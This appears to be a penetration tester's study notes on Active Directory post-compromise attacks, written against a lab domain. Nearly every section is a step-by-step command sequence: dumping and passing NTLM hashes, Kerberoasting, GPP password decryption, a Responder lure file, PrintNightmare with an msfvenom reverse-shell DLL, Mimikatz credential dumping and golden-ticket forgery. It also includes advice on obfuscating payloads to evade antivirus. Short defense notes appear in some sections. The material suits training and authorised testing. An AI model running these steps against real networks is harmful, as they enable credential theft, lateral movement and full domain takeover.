# Active Directory: Post-Compromise Enumeration

---


### Pass the Hash / Password 

> Used when you can crack a password and/or dump the SAM hashes on a target to move laterally across the network.

Pass the Password:
1. dump password hashes on target machine with `impacket-dumpsecrets`:
	- usage: `impacket-secretsdump <domain>/<user>:<password>@<ip_address>`
	- i.e. `impacket-secretsdump marvel/pparker:Password1@10.0.2.6`
2. crack the hash:
	- copy the hashes found into a text file
	- with hashcat: `hascat -m 1000 hashes.txt rockyou.txt -O`
	- if a blank password comes back then it's likely the account's password has been disabled
3. use `crackmapexec` to pass the password:
	- usage: `crackmapexec smb <subnet> -u <user> -d <domain> -p <password>`
	- i.e. `crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1`
	- crackmapexec will try to use credentials to access every machine on the subnet via SMB 
	- you can use the `--sam` option to automatically dump the SAM database on successful login
4. use `impacket-psexec` to try to get a shell on the system:
	- usage: `impacket-psexec <domain>/<user>:<password>@<ip_address>`
	- i.e. `impacket-psexec marvel/fcastle:Password1@10.0.2.6`
	
Pass the Hash:
1. if you cannot crack it, then pass the hash with `crackmapexec`: 
	- copy the second half of the SAM hash (i.e. `64f12cddaa88057e06a81b54e73b949b` in `Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`) -- the NT hash
	- usage: `crackmapexec smb <subnet> -u "<user>" -H <hash> --local-auth`
	- i.e. `crackmapexec smb 10.0.2.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth`
2. use `impacket-psexec` to get a shell on the system:
	- usage: `impacket-psexec "<user>":@<ip_address> -hashes <full_hash>`
	- i.e. `impacket-psexec "Frank Castle":@10.0.2.15 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b`
	- need to use full NTLM hash here
	- this may not work if the user does not have admin privileges 
	
> Best defenses: 
> - limit account re-use -- avoid re-using local admin password, disable Guest and Administrator accounts, limit who is a local admin (least privileges)
> - use strong passwords so hash cannot be cracked
> - use Privilege Access Management (PAM) -- check in/out sensitive passwords, automatically rotate passwords, limit pass attacks by using strong and constantly rotated password 

<br>

### Token Impersonation

> Tokens are temporary keys that allow you to access a system/network without having to provide credentials each time (like cookies). There are two types of tokens:
> - delegate -- created for logging into a machine or using Remote Desktop 
> - impersonate -- "non-interactive" such as attaching a network drive or a domain logon script 
> 
> If you can get access to (impersonate) a token used by a user with higher privileges (i.e. a Domain Admin who has logged onto a machine you've compromised), you can use this token to perform privileged actions.

1. get a Meterpreter reverse shell on a system
	- i.e. via `exploit/windows/smb/psexec` 
2. load the `incognito` module: `load incognito`
	- run `help` to view possible commands
3. list the tokens by user: `list_tokens -u`
4. select a token to impersonate:
	- usage: `impersonate_token <domain>\\<account>`
	- i.e. `impersonate_token MARVEL\\Administrator`
	- run `getuid` to confirm you're running as that user
	- to go back to old account you compromised machine as run `rev2self`

> Best defenses: 
> - limit user/group token creation permissions 
> - account tiering 
> - local admin restriction 

<br>

### Kerberoasting

> Kerberos process:
> 1. user requests Ticket Granting Ticket (TGT) sent to Domain Controller (KDC) with user's NTLM hash 
> 2. user receives TGT encrypted with the Kerberos Ticket Granting Ticket hash (krbgt)
> 3. user requests Ticket Granting Service (TGS) for application server by presenting the TGT they were given to KDC
> 4. user receives a TGS encrypted with server's account hash -- the KDC sends the encrypted TGS but does not know if the user requesting the TGS has access to that application server or not -- this is where kerberoasting stops
> 5. the user presents the TGS for the service (encrypted with the server's account) to the application server 
> 6. the server encrypts the TGS sent by the user (using it's own hash) and replies saying whether or not the user can have access
> .
> Kerberoasting involves getting the TGS and then trying to crack the server's account hash that has been used to encrypt it

1. first you need to get Service Principle Names (SPNs) and dump the service account hashes
	- usage: `impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <ip_of_DC> -request`
	- i.e. `impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.5 -request`
2. copy the hash and try to crack it:
	- with hashcat: `hashcat -m 13100 hash.txt rockyou.txt`
	- with john: `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs`
3. login with that service's credentials
	- i.e. as an SQL service

> Best defenses:
> - very strong passwords 
> - least privilege (i.e. don't run service accounts with admin privileges)

<br>

### Group Policy Preferences (GPP) Attacks

> GPP allowed admins to created policies using embedded credentials that were encrypted and placed in a "cPassword". The key to this encryption was accidentally released and can be used to decrypt these passwords. This was patched in MS14-025, but doesn't prevent previous uses (i.e. if an admin has stored a GPP embedded credentials before patch, then it can be decrypted). Typically found on Windows Server 2012 machines (or before).
> 
> Reference: https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

1. get a shell on the system 
2. enumerate machine, looking for GPP:
	- in Meterpreter run `smb_enum_gpp` to check if there is a GPP embedded credentials on a machine 
	- manually look for `Groups.xml` file 
	- with PowerShell run the `Invoke-GPPPassword.ps1` script 
	- if GPP is running on the machine you should be able to get a domain, username and encrypted password
3. run the `gpp-decrypt` tool in Kali:
	- `gpp-decrypt <hash>`
4. use account to login to machine:
	- i.e. `impacket-psexec <domain>/<username>:<password>@<ip>`
5. if user has no writeable shares (can't use PsExec), you can try kerberoasting:
	- `impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <dc_ip> -request`
	- crack the service ticket password: `hashcat -m 13100 hash.txt rockyou.txt -O`
	- used cracked credentials to login (i.e. with PsExec again)


<br>

### URL File Attacks

> If you compromise a user account with any kind of share access (or an open file share that you can put something into), you can use this access to capture more hashes via Responder (to then crack) to try and get access to a more privileged user account. 
> .
> Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share

1. create a Internet shortcut file and saved to an open share:
	```txt
	[InternetShortcut]
	URL=blah
	WorkingDirectory=blah
	IconFile=\\x.x.x.x\%USERNAME%.icon
	IconIndex=1
	```
	- the IP address (x.x.x.x) is the IP address of the attack machine 
2. saved the file with a `@` or `~` character at the start (to make the file appear at the top of the listing) and `.url` at the end (i.e. `"@test.url"`)
	- you can make the name something relevant to the share that it's in to make it look more appealing 
3. setup Responder:
	- `sudo responder -I eth0 -rdwv`
4. wait for a user to navigate to the share and open the file and then you can begin capturing hashes and either crack them or relay them


<br> 

### PrintNightmare (CVE-2021-1675)

> The PrintNightmare attack is a new exploit that takes advantage of print spooler functionality and because this service runs with system privileges any authenticated attacker (remote or local) can run code execution with system privileges. This is similar to PrintSpoofer but at a more impactful level.  
> .
> cube0x0 RCE: https://github.com/cube0x0/CVE-2021-1675
> calebstewart LPE: https://github.com/calebstewart/CVE-2021-1675

1. check if Domain Controller is vulnerable:
	- `impacket-rpcdump @<dc_ip> | egrep 'MS-RP'`
	- if you see "Print System Remote Protocol" and "Print System Asynchronous Remote Protocol", then the system is vulnerable 
2. download the latest version of impacket and the PrintNightmare Python exploit (i.e. `CVE-2021-1675.py` from RCE above)
3. created a malicious DLL 
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=53 -f dll -o shell.dll`
4. setup `multi/handler` module in Metasploit:
	- `use exploit/multi/handler` -> `set payload windows/x64/meterpreter/reverse_tcp` -> set options
5. setup a file share (to share malicious DLL)
	- `impacket-smbserver share $(pwd)` -- to share current directory as "share"
6. run the exploit (need a user account):
	- `python3 PrintNightmare.py <domain>/<username>:<password>@<dc_ip> '\\<kali_ip>\<share>\<malicious_dll>'
	- if this fails, you may need to run with SMB v2 support (i.e. `impacket-smbserver share $(pwd) -smb2support`)
	- i.e. `python3 PrintNightmare.py marvel.local/fcastle:Password1@10.0.2.5 '\\10.0.2.4\share\shell.dll>'`
	- you need to obfuscate the malicious DLL as Windows Defender (or another AV/EDR) may block it


<br>

### MimiKatz

> MimiKatz is a tool that can be used to view and steal credentials, generate Kerberos tickets, and leverage attacks. It dumps the credentials stored in memory and can be used in lots of attacks; credential dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, and silver ticket. MimiKatz will get caught by AV/EDR if you just upload it and run it on a machine. Hence, you need to obfuscate it, run it in memory, or use another tool which has MimiKatz integrated. 
> 
> Reference: https://github.com/gentilkiwi/mimikatz

Credential dumping:
1. compromise a machine with obtain system/administrator access 
2. download and run MimiKatz in command prompt 
3. in MimiKatz run `privilege::debug` to check if you can debug a process's memory 
	- should see "Privilege '20' OK"
4. run `sekurlsa::logonpasswords` to dump the password hashes (stored in memory) of every user that has logged in since the last reboot 
	- you can try to crack and/or pass the hashes found in attacks  
	- if a domain admin has logged into a user machine then you could use their hash to authenticate the DC
	- you can take advantage of the "wdigest" feature (used on Windows 7 and before, but now turned off by default). This stores passwords in clear text. You can turn it on in MimiKatz (via the registry) and wait for someone to login to the machine to then see their password in clear text. 
5. run `lsadump::sam` (or `lsadump::sam /patch`) to dump the SAM database
	- if this fails with MimiKatz there are alternative options to dump the SAM (i.e. Meterpreter, `impacket-secretsdump`, `samdump2`, or just download the SAM)
6. run `lsadump::lsa /patch` to dump the LSA (Local Security Authority)
	- the LSA is a protected subsystem in Windows authentication that authenticates and creates logon sessions to the local computer 


<br>

### Golden Ticket Attacks 

> The krbtgt account is the Kerberos Ticket Granting Ticket (TGT) account that generates tickets. If you can get the hash of that account, you can generate TGT tickets and get entire access of the domain (a golden ticket). 

1. download and run MimiKatz
2. run `privilge::debug` to verify permissions 
3. run `lsadump::lsa /inject /name:krbtgt` to dump the krbtgt account information 
4. open a notepad and copy the domain SID and the NTLM hash of the krbtgt account 
5. run `kerberos::golden /user:Administrator /domain:<domain_name> /sid:<sid_found> /krbtgt:<ntlm_hash> /id:500 /ptt`
	- the user name can be anything, an ID of 500 means an admin account, and `ptt` mean use pass-the-ticket to current session (passes ticket generated to current session)
6. run `misc::cmd` to generate a command prompt using the golden ticket just created 
	- you can use the Windows tool PsExec to then remotely access any machine on the domain 



